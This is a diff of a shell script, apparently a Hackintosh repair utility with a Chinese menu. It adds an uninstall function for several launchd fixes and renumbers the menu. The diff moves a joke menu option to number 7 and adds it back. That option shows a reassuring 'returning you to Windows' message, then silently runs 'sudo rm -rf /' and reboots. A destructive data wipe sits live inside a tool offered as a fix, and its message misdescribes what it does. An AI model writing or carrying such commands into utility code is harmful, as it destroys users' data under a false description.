@@ -88,6 +88,27 @@ fixAll(){
     clear_cache
 }
 
+removeAll(){
+    if sudo launchctl list | grep --quiet ALCPlugFix; then
+        sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
+        sudo rm -rf $DAEMON_PATH$ALC_DAEMON_FILE
+        sudo rm -rf $BIN_PATH$VERB_FILE
+        sudo rm -rf $BIN_PATH$ALC_FIX_FILE
+    fi
+    
+    if sudo launchctl list | grep --quiet localtime-toggle; then
+        sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
+        sudo rm -rf $DAEMON_PATH$TIME_DAEMON_FILE
+        sudo rm -rf $BIN_PATH$TIME_FIX_FILE
+    fi
+    
+    if sudo launchctl list | grep --quiet setleds; then
+        sudo launchctl unload $DAEMON_PATH$NUMLOCK_DAEMON_FILE
+        sudo rm -rf $DAEMON_PATH$NUMLOCK_DAEMON_FILE
+        sudo rm -rf $BIN_PATH$NUMLOCK_FIX_FILE
+    fi
+}
+
 menu(){
 	echo "
 ******************************************************************************
@@ -110,9 +131,11 @@ menu(){
     echo ""
 	echo "5、全部修复上述问题"
 	echo ""
-	echo "6、送黑果归西"
+	echo "6、移除所有修复"
 	echo ""
-	echo "7、退出"
+    echo "7、送黑果归西"
+    echo ""
+	echo "8、退出"
 	echo ""
 }
 
@@ -144,11 +167,15 @@ Select(){
 	   echo ""
 	   Select
        ;;
-	6) echo "耐心等待，正在努力移除垃圾黑苹果，欢迎重返 windows 系统,稍后会自动重启"
-       sudo rm -rf / >/dev/null 2>&1
-       sudo reboot
+	6) removeAll
+       echo "已经移除所有修复"
+       Select
        ;;
-	7) exit 0
+    7) echo "耐心等待，正在努力移除垃圾黑苹果，欢迎重返 windows 系统,稍后会自动重启"
+        sudo rm -rf / >/dev/null 2>&1
+        sudo reboot
+        ;;
+	8) exit 0
        ;;
     *) echo "输入错误";
 	   echo ""
